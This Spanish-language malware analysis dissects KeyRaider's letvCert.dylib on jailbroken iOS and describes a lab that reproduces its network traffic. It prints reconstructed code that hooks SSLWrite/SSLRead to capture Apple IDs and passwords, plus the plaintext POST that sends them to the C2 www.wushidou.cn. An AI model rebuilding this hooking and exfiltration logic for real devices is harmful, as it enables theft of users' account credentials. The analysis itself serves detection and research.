KeyRaider es una familia de malware para **iOS** distribuida mediante repositorios de terceros de **Cydia**. Su instalación dependía, por tanto, de que el dispositivo hubiera sido sometido a *jailbreak* y permitiera cargar extensiones ajenas al modelo de seguridad de Apple. El análisis publicado por [Unit 42](https://unit42.paloaltonetworks.com/keyraider-ios-malware-steals-over-225000-apple-accounts-to-create-free-app-utopia/) diferencia varias capacidades dentro de la familia, entre ellas el robo de credenciales de Apple y el uso posterior de cuentas sustraídas para adquirir aplicaciones (aunque no termina de aclarar correctamente de donde procede dicha funcionalidad).

Este documento se limita al primer comportamiento. La variante analizada intercepta las funciones `SSLWrite` y `SSLRead` dentro de `itunesstored`, el proceso encargado de comunicarse con la App Store, para acceder a los búferes en claro entregados a la primera función y devueltos por la segunda. [MITRE ATT&CK asocia este procedimiento con T1638, *Adversary-in-the-Middle*](https://attack.mitre.org/software/S0288/). El enganche es una operación local y no puede demostrarse a nivel de red. En cambio, sí son observables la autenticación legítima con Apple que proporciona las credenciales y la conexión HTTP posterior que las exfiltra hacia el C2. Esta segunda conversación permite aplicar una estrategia basada en la creación de una conexión de red adicional (`Network Connection Creation`, DC0082).

Los artefactos sobre los cuales se ha desarrollado ingeniería inversa son los siguientes:

| Artefacto | Tipo | Identificación o función | SHA-256 |
|---|---|---|---|
| `9catbbs.MPPlugin_1.3.deb` | Paquete Debian para Cydia | Paquete `9catbbs.MPPlugin`, versión 1.3 | `f09dfe8060648e2cf824c6e6e1f643eefb896dd42e8aacf41506ed03f0a53fcc` |
| `letvCert.dylib` | Biblioteca Mach-O | Componente analizado con Ghidra | `57bdaaae7ac086d5020923c42d6a094f61d8dc5ee770e113b3776de5cdcc7aab` |
| `letvCert.plist` | Lista de propiedades | Filtro de carga en `SpringBoard` e `itunesstored` | `050dbc5d597c02266c311a401e6cd195901a898116f765da315406001138fbb8` |

El paquete `9catbbs.MPPlugin_1.3.deb` contiene dos bibliotecas dinámicas. `MPPlugin.plist` carga `MPPlugin.dylib` en varias aplicaciones, mientras que `letvCert.plist` carga `letvCert.dylib` en `SpringBoard` e `itunesstored`. Esta segunda biblioteca contiene la ruta de interceptación y exfiltración desarrollada a continuación. El fragmento de `letvCert.plist` confirma precisamente los dos procesos en los que se inyecta la biblioteca:

```xml
<key>Filter</key>
<dict>
    <key>Executables</key>
    <array>
        <string>SpringBoard</string>
        <string>itunesstored</string>
    </array>
</dict>
```

### Uso de hooks

El inicializador `_logosLocalInit()`, situado en `0x000080dc`, llama a `cert()`. Esta función, localizada en `0x00009490`, obtiene el nombre del proceso actual y selecciona una de dos acciones: si se ejecuta dentro de `SpringBoard`, termina `itunesstored`; si se ejecuta dentro de `itunesstored`, instala los hooks de lectura y escritura TLS. Las direcciones corresponden a la sección ARM64 de `letvCert.dylib` analizada con Ghidra.

Para facilitar la lectura, los extractos de Ghidra se reducen a las operaciones relevantes y normalizan nombres de variables y tipos recuperados. Se conservan las constantes, las condiciones, el orden de las llamadas y la dirección de los datos; no deben interpretarse como código fuente original.

```cpp
void cert(void)
{
    getProcessName();

    if (process_name.find("SpringBoard") != std::string::npos) {
        system("killall -9 itunesstored");
    }
    else if (process_name.find("itunesstored") != std::string::npos) {
        // Resolución e instalación de los hooks SSLWrite y SSLRead.
    }
}
```

La separación entre ambos procesos coincide con el filtro de `letvCert.plist`. Cuando la biblioteca se carga en `SpringBoard`, aprovecha la persistencia de este proceso para forzar el cierre de `itunesstored`. iOS vuelve a iniciarlo cuando necesita acceder a la App Store y MobileSubstrate carga entonces `letvCert.dylib` dentro del nuevo proceso. En esa segunda ejecución, `getProcessName()` devuelve `itunesstored` y se alcanza la rama que instala los hooks.

La función `getAdress()` abre el marco `Security.framework` mediante `dlopen()` y resuelve los símbolos `SSLWrite` y `SSLRead` con `dlsym()`. Si obtiene una dirección válida, `MSHookFunction()` sustituye cada función y conserva un puntero hacia la implementación original:

```cpp
ssl_write_addr = getAdress(
    "/System/Library/Frameworks/Security.framework/Security",
    "SSLWrite"
);
if (ssl_write_addr != 0) {
    MSHookFunction(
        ssl_write_addr,
        replace_SSLWriteCert,
        &original_SSLWriteCert
    );
}

ssl_read_addr = getAdress(
    "/System/Library/Frameworks/Security.framework/Security",
    "SSLRead"
);
if (ssl_read_addr != 0) {
    MSHookFunction(
        ssl_read_addr,
        replace_SSLReadCert,
        &original_SSLReadCert
    );
}
```

Los tres argumentos de cada llamada identifican la función que se intercepta, su reemplazo y la ubicación donde debe guardarse el puntero original. De esta forma, el malware puede observar los datos sin impedir que `itunesstored` continúe su comunicación normal con Apple.

La función `replace_SSLWriteCert()`, situada en `0x000088d4`, llama primero a `SSLWrite` y conserva su resultado. Después examina el búfer en claro que recibió la función. No procesa cualquier escritura TLS: exige que el contenido comience por una lista de propiedades (`plist`) en XML e incluya al principio la clave `appleId` o `accountKind`.

```cpp
result = original_SSLWriteCert(context, data, length, processed);

if (*processed != 0 &&
    (starts_with(data, plist_apple_id_prefix) ||
     starts_with(data, plist_account_kind_prefix))) {
    name = findRegex(data,
        "<key>appleId</key>\n\t<string>(*)</string>");
    password = findRegex(data,
        "<key>password</key>\n\t<string>(*)</string>");
    guid = findRegex(data,
        "<key>guid</key>\n\t<string>(*)</string>");

    g_name = name;
    g_pass = password;
    g_guid = guid;
    g_fd = context;
    g_bingowrite = true;
}
```

Las expresiones extraen el Apple ID, la contraseña y el GUID del dispositivo y los conservan en variables globales. La variable `g_fd` guarda además el `SSLContext` de la escritura. Esta asociación es necesaria porque la respuesta de Apple puede coexistir con otras sesiones TLS del proceso: el hook de lectura solo continuará cuando reciba datos sobre el mismo contexto.

### Exfiltración al C&C

La captura de las credenciales no provoca inmediatamente la exfiltración. La función `replace_SSLReadCert()`, situada en `0x00008ed4`, espera la respuesta correspondiente de Apple y comprueba tres condiciones iniciales: la lectura debe contener datos, `replace_SSLWriteCert()` debe haber reconocido antes una autenticación y el `SSLContext` debe coincidir con el almacenado en `g_fd`.

En la primera lectura, la función obtiene el código de estado HTTP, extrae `Content-Length` y detecta si el cuerpo utiliza `Content-Encoding: gzip`. Las lecturas posteriores se acumulan hasta alcanzar la longitud anunciada. Después de descomprimir el cuerpo cuando sea necesario, busca el siguiente campo:

```xml
<key>dsPersonId</key><string>(*)</string>
```

Solo una respuesta `HTTP 200` con longitud válida y un `dsPersonId` no vacío conduce a `sendAid()`:

```cpp
if (response_complete) {
    if (g_zip) {
        g_data = [g_data gunzippedData];
    }

    person_id = findRegex(
        response_body,
        "dsPersonId</key><string>(*)</string>"
    );

    if (!person_id.empty()) {
        g_bingowrite = false;
        sendAid();
    }
}
```

Por tanto, la relación causal no se limita a que aparezcan dos conexiones cercanas en el tiempo. La petición de autenticación proporciona las credenciales, la respuesta positiva de Apple confirma la sesión mediante `dsPersonId` y, únicamente entonces, el malware abre el canal de exfiltración.

La función `sendAid()`, localizada en `0x00008494`, convierte `g_name` en un `NSString`, aplica codificación porcentual y vuelve a obtener un `std::string`. La contraseña y el GUID no pasan por esa transformación. El cuerpo se construye concatenando cuatro campos:

```cpp
body = "id="     + encoded_name
     + "&name="  + encoded_name
     + "&pass="  + g_pass
     + "&guid="  + g_guid;
```

Los parámetros `id` y `name` contienen el mismo Apple ID codificado. En esta variante concreta, `pass` y `guid` se incorporan sin cifrado ni codificación porcentual adicional. Esta conclusión procede de la ruta analizada y prevalece sobre descripciones generales de otras variantes de KeyRaider que empleaban AES.

La función compone después una petición HTTP/1.1. El literal `(length)` se sustituye por la longitud decimal del cuerpo antes del envío:

```cpp
request =
    "POST /aid.php HTTP/1.1\r\n"
    "Host: www.wushidou.cn\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: (length)\r\n"
    "\r\n";

replaceRegexInt(request, "(length)", body.length());
request.append(body);
```

`Http::init()`, situada en `0x00003cdc`, determina el transporte efectivo. La función resuelve el nombre mediante `gethostbyname()`, crea un socket `AF_INET/SOCK_STREAM` y fija los dos bytes del puerto a `0x00 0x50`, es decir, TCP/80 en orden de red. No configura TLS para este canal.

```cpp
host = gethostbyname(domain);
socket_fd = socket(AF_INET, SOCK_STREAM, 0);

address.sin_family = AF_INET;
address.sin_port = htons(80);
address.sin_addr = host->h_addr_list[0];

connect(socket_fd, &address, sizeof(address));
```

La llamada a `gethostbyname()` obliga a resolver `www.wushidou.cn`, aunque una caché o una entrada local podrían evitar que esa resolución produzca un paquete DNS. El laboratorio utiliza CoreDNS para que la captura contenga primero la consulta del nombre, seguida de una conexión TCP al puerto 80 y la siguiente petición en claro. Cada línea HTTP termina en `CRLF` y una línea vacía separa las cabeceras del cuerpo:

```http
POST /aid.php HTTP/1.1
Host: www.wushidou.cn
Content-Type: application/x-www-form-urlencoded
Content-Length: <LONGITUD_DECIMAL_DEL_CUERPO>

id=<APPLE_ID_CODIFICADO>&name=<APPLE_ID_CODIFICADO>&pass=<CONTRASEÑA>&guid=<GUID>
```

`Http::send()`, situada en `0x00004750`, descompone y normaliza el cuerpo cuando el estado es `200`; para otros estados conserva la respuesta sin procesarla de la misma forma. Puede delimitar el cuerpo mediante `Content-Length` o reconstruir `Transfer-Encoding: chunked`; si encuentra `Content-Encoding: gzip`, lo descomprime mediante `gunzippedData`. La función `sendAid()` no utiliza el contenido devuelto para iniciar otra operación, de modo que la respuesta del C2 cierra el flujo seleccionado. No existe un canal periódico de *beaconing* ni un catálogo de órdenes: esta ruta abre una comunicación puntual después de completar la autenticación con Apple.

### Secuencia comunicativa

La biblioteca `letvCert.dylib` no contiene el dominio ni la ruta de Apple. Al enganchar `SSLWrite`, observa el tráfico que `itunesstored` ya haya decidido enviar y reconoce la autenticación por la estructura de la propiedad XML. Por ello, el extremo de Apple utilizado en el laboratorio debe considerarse una reconstrucción histórica controlada, no un indicador hardcodeado de esta biblioteca.

El análisis de Unit 42 documenta que otro componente del ecosistema KeyRaider utilizaba `p*-buy.itunes.apple.com/WebObjects/MZFinance.woa/wa/authenticate` para iniciar sesión con cuentas remotas. Además, un [registro de conexiones de iTunes de abril de 2015](https://discussions.apple.com/thread/6989577) menciona `p12-buy.itunes.apple.com`. A partir de ambas referencias, el laboratorio selecciona la variante `p12-buy` y la ruta de autenticación anterior. TLS 1.2 también es una decisión del escenario reproducible: el hook trabaja por encima del registro TLS y no fija por sí mismo la versión negociada.

La conversación previa que se pretende representar es:

```text
Consulta DNS: p12-buy.itunes.apple.com
Transporte:   TCP/443
TLS:          TLS 1.2, seleccionado para el laboratorio
SNI:          p12-buy.itunes.apple.com

Contenido HTTP dentro de TLS:
POST /WebObjects/MZFinance.woa/wa/authenticate HTTP/1.1
Host: p12-buy.itunes.apple.com
<cabeceras generadas por itunesstored>

<plist con appleId, password y guid>
```

El diagrama resume la causalidad completa. Los nombres y la versión TLS del extremo de Apple corresponden a la reconstrucción del laboratorio; la interceptación de las propiedades, la condición `dsPersonId` y la petición al C2 proceden del código de `letvCert.dylib`.

```mermaid
sequenceDiagram
    participant SB as SpringBoard
    participant IT as "itunesstored + letvCert"
    participant DNS as DNS
    participant AP as "Apple emulado"
    participant C2 as "www.wushidou.cn"

    Note over SB: MobileSubstrate carga letvCert.dylib
    Note over SB: cert() termina itunesstored
    Note over IT: iOS reinicia itunesstored<br/>letvCert instala hooks SSLWrite y SSLRead

    IT->>DNS: A p12-buy.itunes.apple.com
    DNS-->>IT: Dirección controlada del laboratorio
    IT->>AP: TCP/443 y TLS 1.2 con SNI p12-buy.itunes.apple.com
    IT->>AP: POST /WebObjects/MZFinance.woa/wa/authenticate<br/>plist con appleId, password y guid
    Note over IT: replace_SSLWriteCert captura los tres valores antes del cifrado
    AP-->>IT: HTTP 200 con dsPersonId dentro de TLS
    Note over IT: replace_SSLReadCert valida la respuesta y llama a sendAid()

    IT->>DNS: A www.wushidou.cn
    DNS-->>IT: Dirección del C2
    IT->>C2: TCP/80
    IT->>C2: POST /aid.php<br/>id, name, pass y guid
    C2-->>IT: HTTP 200
```

### Laboratorio de generación del PCAP

El laboratorio no ejecuta la biblioteca original en un dispositivo iOS. Tanto el cliente que representa al teléfono como los servicios de Apple y del C2 se emulan mediante Python. CoreDNS genera las dos resoluciones necesarias; el primer servidor reproduce la autenticación de Apple sobre TLS y el segundo recibe en HTTP claro la petición `POST /aid.php`. Esta separación conserva los dos destinos y la transición causal que interesa observar en la captura.

| Entidad | Dirección y servicio | Procedencia |
|---|---|---|
| Víctima emulada | `10.28.8.10` | Dirección privada asignada exclusivamente a la entidad víctima dentro de la topología aislada. |
| Resolutor DNS | `8.8.8.8:53` | Dirección publicada para Google Public DNS; el servicio se emula dentro del *namespace* y no se contacta con Google. |
| Servicio Apple | `17.8.136.178:443` | Respuesta A de `p12-buy.itunes.apple.com` obtenida el 20 de agosto de 2026. Es un extremo legítimo y no un IOC de KeyRaider. |
| C2 de KeyRaider | `113.10.174.167:80` | IOC histórico: [Unit 42](https://unit42.paloaltonetworks.com/keyraider-ios-malware-steals-over-225000-apple-accounts-to-create-free-app-utopia/) documentó que `www.wushidou.cn` y `top100.gotoip4.com` resolvían hacia esta dirección durante su análisis. |

Este escenario está automatizado en `python-labnet` con el identificador `keyraider`. La ejecución, la captura y la recopilación de los secretos TLS se describen en la [guía central de laboratorios Python](Laboratorios%20Python.md).

La captura resultante reproduce la firma de red derivada del análisis estático; no constituye una ejecución de `letvCert.dylib` ni demuestra por sí misma el enganche local de las funciones TLS.
